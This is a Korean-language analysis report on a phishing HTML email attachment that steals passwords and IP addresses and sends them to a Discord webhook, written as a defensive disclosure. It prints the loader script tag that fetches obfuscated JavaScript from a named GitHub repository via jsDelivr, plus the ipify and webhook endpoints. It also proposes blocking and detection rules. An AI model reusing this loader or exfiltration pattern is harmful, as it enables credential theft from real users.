# Discord Webhook을 활용한 피싱 공격 분석 보고서

## 1. 개요

본 보고서는 Discord Webhook API를 악용하여 사용자 정보를 탈취하는 악성 이메일 첨부파일에 대한 분석 결과를 담고 있습니다. 해당 악성코드는 Discord 메신저의 웹훅 기능을 이용해 사용자의 민감 정보를 외부로 유출하는 형태의 공격입니다.

## 2. 악성 이메일 특징

- **공격 유형**: Discord Webhook API를 활용한 정보 탈취
- **전송 방식**: 이메일 첨부파일(HTML)
- **목표**: 사용자 인증 정보 및 IP 주소 탈취

## 3. 악성 코드 분석

### 3.1 첨부파일 기본 정보

- **파일 형식**: HTML 파일 (JavaScript 코드 포함)
- **MIME 유형**: ASCII 텍스트

### 3.2 외부 리소스 참조

HTML 파일은 다음과 같은 외부 JavaScript 파일을 로드합니다:

```html
<script src="https://cdn.jsdelivr.net/gh/fridaybella2404/animalcare-reserves@main/1a3f7e9b2c4d5a6b8e0f1d2c3b4a5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5.js?hash=85f58b7cd1f07c325b152f63d76acdaca3ce5c198f0f38c0cb868c301c805cbc"></script>
```

#### 주요 특징:
- **CDN 사용**: JSdelivr CDN을 통해 외부 코드 로드
- **소스 위치**: GitHub의 `fridaybella2404/animalcare-reserves` 저장소
- **파일명 특징**: 난독화된 파일명과 해시값 포함

### 3.3 코드 구성 분석

#### 3.3.1 난독화된 JavaScript

악성 코드는 여러 층의 난독화 기법을 사용하여 분석을 어렵게 만들고 있습니다:
```javascript
(function(_0x37f612,_0x3f6271){var _0x528dc7={_0x219712:0x12f,...}
// 수백 줄의 난독화된 코드
```

#### 3.3.2 이메일 주소 포함
```javascript
const oliveOil = "test@gmail.com"
```
- 공격자의 이메일 또는 피해자 이메일로 추정되는 이메일 주소가 하드코딩되어 있습니다.

### 3.4 외부 스크립트 분석

GitHub 저장소에서 로드되는 JavaScript 파일은 다음과 같은 특징을 가지고 있습니다:

1. **다중 난독화**: 여러 층의 난독화 기법을 사용하여 정적 분석을 방해
2. **document.write 사용**: HTML을 동적으로 주입하여 피싱 페이지 생성
3. **Base64 인코딩**: CSS 및 기타 리소스를 Base64로 인코딩하여 탐지 회피

## 4. 공격 흐름 분석

### 4.1 사용자 상호작용
1. 사용자가 이메일의 첨부파일(HTML)을 열고 실행
2. 정상적인 서비스로 위장한 로그인 페이지 표시
3. 사용자가 비밀번호 입력

### 4.2 정보 수집 및 유출
1. **사용자 IP 주소 수집**:
   ```
   https://api.ipify.org?format=json
   ```
   위 API를 통해 사용자의 공용 IP 주소를 수집합니다.

2. **Discord Webhook으로 정보 전송**:
   ```
   https://discord.com/api/webhooks/...
   ```
   수집된 비밀번호와 IP 정보를 Discord Webhook을 통해 공격자의 Discord 채널로 전송합니다.

## 5. 공격 기법 및 특징

1. **정상 서비스 악용**: 
   - JSdelivr CDN(합법적 서비스)을 악용하여 보안 솔루션 우회
   - GitHub(합법적 코드 저장소)를 악용하여 의심 회피
   - Discord Webhook(합법적 API)을 악용한 데이터 유출

2. **난독화 기법**:
   - 변수 난독화
   - 문자열 인코딩
   - Base64 인코딩
   - 코드 분할 및 재조합

## 6. 결론 및 대응 방안

본 분석을 통해 해당 악성 이메일은 Discord Webhook을 악용한 정보 탈취 목적의 피싱 공격으로 확인되었습니다. 해당 공격은 합법적인 서비스들을 교묘하게 활용하여 보안 솔루션의 탐지를 회피하는 특징을 가지고 있습니다.

### 권장 대응 방안:

1. **이메일 첨부파일 주의**: 출처가 불분명한 이메일의 HTML 첨부파일 실행 금지
2. **CDN 모니터링**: JSdelivr 등 CDN을 통한 의심스러운 스크립트 로드 모니터링
3. **Discord Webhook 트래픽 차단**: 조직 내부에서 Discord Webhook 관련 비인가 트래픽 차단
4. **다중 인증(MFA)**: 중요 계정에 다중 인증 적용으로 피싱으로 인한 피해 최소화
5. **보안 인식 교육**: 직원들에게 피싱 공격의 위험성과 식별 방법에 대한 정기적 교육

### 기술적 대응 방안:
- 이메일 필터링 솔루션에 fridaybella2404 관련 GitHub 저장소 URL 차단 규칙 추가
- 웹 프록시에서 Discord Webhook API 호출 모니터링 및 차단
- EDR 솔루션에서 document.write() 함수와 Base64 디코딩 후 실행되는 스크립트 탐지 규칙 강화